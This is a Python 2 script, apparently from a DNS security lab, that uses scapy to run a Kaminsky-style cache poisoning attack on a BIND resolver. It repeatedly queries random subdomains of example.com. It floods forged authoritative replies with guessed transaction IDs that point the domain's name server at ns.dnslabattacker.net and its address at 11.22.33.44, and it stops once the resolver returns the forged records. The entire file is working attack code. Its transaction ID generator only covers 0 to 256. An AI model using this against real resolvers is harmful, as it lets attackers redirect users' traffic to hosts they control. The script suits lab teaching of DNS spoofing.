#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        # only for record keeping and create fake domain name
        original_name = 'example.com.'
        fake_post_domain = "." + original_name
        fake_subdomain = getRandomSubDomain()
        fake_name = fake_subdomain + fake_post_domain

        # fake Name server name
        fake_NS = 'ns.dnslabattacker.net.'
        fake_ip = '11.22.33.44'
        time_to_live = 300

        dnsPacket = DNS(rd=1, qd=DNSQR(qname=fake_name))
        sendPacket(sock, dnsPacket, my_ip, my_port)

        # attempt to guess the transaction ID
        # found = False

        fake_id = getRandomTXID()
        fake_package = DNS(id=fake_id, 
                            qr=1, 
                            opcode=0, 
                            aa=1, 
                            qdcount=1, 
                            qd=DNSQR(qname=fake_name), 
                            an=DNSRR(rrname=fake_name, rdata = fake_ip, type="A", ttl=time_to_live), 
                            ns=DNSRR(rrname="example.com.", rdata = fake_NS, type="NS", ttl =time_to_live)
                            )
        i = 0
        while i < 110:
            fake_tx_id = getRandomTXID()
            fake_package[DNS].id = fake_tx_id
            sendPacket(sock, fake_package, my_ip, my_query_port)   
            i += 1
        
        response = sock.recv(4096)
        response = DNS(response)
        response.show()
        
        if response[DNS].an != None:
            if (response[DNS].an.rrname == fake_name) and (response[DNS].an.rdata == fake_ip) and (response[DNS].ns.rdata == fake_NS):
                sock.close()
                break
        sock.close()
        
if __name__ == '__main__':
    exampleSendDNSQuery()
